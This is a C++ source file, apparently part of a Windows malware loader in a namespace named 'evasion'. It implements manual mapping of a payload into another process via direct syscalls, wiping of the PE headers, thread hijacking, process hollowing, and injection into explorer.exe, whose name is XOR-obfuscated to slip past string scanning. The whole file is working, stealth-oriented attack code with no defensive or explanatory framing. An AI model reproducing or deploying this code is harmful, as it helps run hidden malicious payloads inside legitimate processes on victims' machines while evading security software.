#include "Injector.h"
#include "Syscalls.h"
#include "NtStructs.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include "../utils/ApiHasher.h"
#include <tlhelp32.h>
#include <algorithm>
#include <cwctype>

namespace evasion {

namespace {
    struct RELOC_ENTRY {
        WORD Offset : 12;
        WORD Type : 4;
    };
}

bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID* ppRemoteBase) {
    PBYTE pSrcData = (PBYTE)payload.data();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);

    PVOID pTargetBase = NULL;
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

    // 1. Alloc RW via syscall
    NTSTATUS status = SysNtAllocateVirtualMemory(hProcess, &pTargetBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        LOG_ERR("MapAndInject: NtAllocateVirtualMemory fail. Status: " + utils::Shared::ToHex((unsigned long long)status));
        return false;
    }
    LOG_INFO("MapAndInject: Allocated at " + utils::Shared::ToHex((unsigned long long)pTargetBase));

    // 2. Map & Reloc locally
    std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
    PBYTE pLocalBase = localMapping.data();
    memcpy(pLocalBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData == 0) continue;
        memcpy(pLocalBase + pSectionHeader[i].VirtualAddress, pSrcData + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);
    }

    DWORD_PTR delta = (DWORD_PTR)pTargetBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        auto& relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pLocalBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress != 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)(pReloc + 1);
                for (DWORD i = 0; i < count; i++) {
                    if ((pEntry[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        PDWORD_PTR pAddr = (PDWORD_PTR)(pLocalBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                        *pAddr += delta;
                    } else if ((pEntry[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                         PDWORD pAddr = (PDWORD)(pLocalBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                         *pAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // 2.5 Resolve IAT
    auto& importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pLocalBase + importDir.VirtualAddress);
        while (pImportDesc->Name != 0) {
            char* szDllName = (char*)(pLocalBase + pImportDesc->Name);
            HMODULE hDll = GetModuleHandleA(szDllName);
            if (!hDll) hDll = LoadLibraryA(szDllName);
            if (hDll) {
                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pLocalBase + pImportDesc->FirstThunk);
                PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)(pLocalBase + (pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk));
                while (pThunk->u1.AddressOfData != 0) {
                    FARPROC pFunc = NULL;
                    if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
                        pFunc = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
                    } else {
                        PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pLocalBase + pOriginalThunk->u1.AddressOfData);
                        pFunc = GetProcAddress(hDll, (LPCSTR)pImportByName->Name);
                    }
                    if (pFunc) {
                        pThunk->u1.Function = (DWORD_PTR)pFunc;
                    } else {
                        LOG_ERR("MapAndInject: Failed to resolve import.");
                    }
                    pThunk++;
                    pOriginalThunk++;
                }
            } else {
                LOG_ERR("MapAndInject: Failed to load DLL: " + std::string(szDllName));
            }
            pImportDesc++;
        }
    }

    // 3. Write via syscall
    if (!NT_SUCCESS(SysNtWriteVirtualMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL))) {
        LOG_ERR("MapAndInject: NtWriteVirtualMemory fail.");
        return false;
    }

    // 4. Wipe Headers
    std::vector<uint8_t> zeroHeader(pNtHeaders->OptionalHeader.SizeOfHeaders, 0);
    SysNtWriteVirtualMemory(hProcess, pTargetBase, zeroHeader.data(), zeroHeader.size(), NULL);

    // 5. Section Protections
    PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PVOID pSectionAddr = (PVOID)((PBYTE)pTargetBase + pSect[i].VirtualAddress);
        SIZE_T sSize = pSect[i].Misc.VirtualSize;
        DWORD flProtect = 0;

        if (pSect[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            flProtect = PAGE_READWRITE;
        } else if (pSect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            flProtect = (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
        } else if (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) {
            flProtect = PAGE_READONLY;
        } else {
            flProtect = PAGE_NOACCESS;
        }

        if (pSect[i].Characteristics & IMAGE_SCN_MEM_NOT_CACHED) flProtect |= PAGE_NOCACHE;

        DWORD oldP;
        SysNtProtectVirtualMemory(hProcess, &pSectionAddr, &sSize, flProtect, &oldP);
    }

    if (ppRemoteBase) *ppRemoteBase = pTargetBase;
    return true;
}

bool Injector::HijackThread(HANDLE hThread, PVOID pEntryPoint) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;

    if (!NT_SUCCESS(SysNtSuspendThread(hThread, NULL))) return false;

    if (!NT_SUCCESS(SysNtGetContextThread(hThread, &ctx))) {
        SysNtResumeThread(hThread, NULL);
        return false;
    }

#ifdef _M_AMD64
    LOG_INFO("HijackThread: RIP: " + utils::Shared::ToHex((unsigned long long)ctx.Rip) + " -> " + utils::Shared::ToHex((unsigned long long)pEntryPoint));
    ctx.Rip = (DWORD64)pEntryPoint;
#else
    LOG_INFO("HijackThread: EIP: " + utils::Shared::ToHex((unsigned long long)ctx.Eip) + " -> " + utils::Shared::ToHex((unsigned long long)pEntryPoint));
    ctx.Eip = (DWORD)pEntryPoint;
#endif

    if (!NT_SUCCESS(SysNtSetContextThread(hThread, &ctx))) {
        LOG_ERR("HijackThread: NtSetContextThread fail.");
        SysNtResumeThread(hThread, NULL);
        return false;
    }

    SysNtResumeThread(hThread, NULL);
    return true;
}

bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload) {
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        LOG_ERR("HollowProcess: CreateProcess fail. Target: " + utils::ws2s(targetPath) + " Error: " + std::to_string(GetLastError()));
        return false;
    }
    PVOID pRemoteBase = NULL;
    if (!MapAndInject(pi.hProcess, payload, &pRemoteBase)) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return false;
    }
    PBYTE pSrcData = (PBYTE)payload.data();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
    PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

    LOG_INFO("HollowProcess: EntryPoint at " + utils::Shared::ToHex((unsigned long long)pEntryPoint));

    if (HijackThread(pi.hThread, pEntryPoint)) {
         LOG_INFO("HollowProcess: Success.");
    } else {
         LOG_ERR("HollowProcess: Hijack fail.");
         TerminateProcess(pi.hProcess, 0);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                std::wstring currentProcess = pe.szExeFile;
                for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
                std::wstring targetProcess = processName;
                for (auto& c : targetProcess) c = (wchar_t)::towlower(c);
                if (currentProcess == targetProcess) { pid = pe.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
    (void)dropperPath;
    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
    std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
    DWORD pid = GetProcessIdByName(explorer);
    if (pid == 0) {
        LOG_ERR("Inject: explorer.exe not found.");
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        LOG_ERR("Inject: OpenProcess fail. PID: " + std::to_string(pid));
        return false;
    }

    PVOID pRemoteBase = NULL;
    bool success = MapAndInject(hProcess, payload, &pRemoteBase);
    if (success) {
        PBYTE pSrcData = (PBYTE)payload.data();
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
        PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

        HANDLE hRemoteThread = NULL;
        NTSTATUS status = SysNtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, pEntryPoint, NULL, 0, 0, 0, 0, NULL);
        if (NT_SUCCESS(status)) {
            LOG_INFO("Inject: NtCreateThreadEx success. TID: " + std::to_string(GetThreadId(hRemoteThread)));
            CloseHandle(hRemoteThread);
        } else {
            LOG_ERR("Inject: NtCreateThreadEx fail. Status: " + utils::Shared::ToHex((unsigned long long)status));
            success = false;
        }
    }
    CloseHandle(hProcess);
    return success;
}

} // namespace evasion
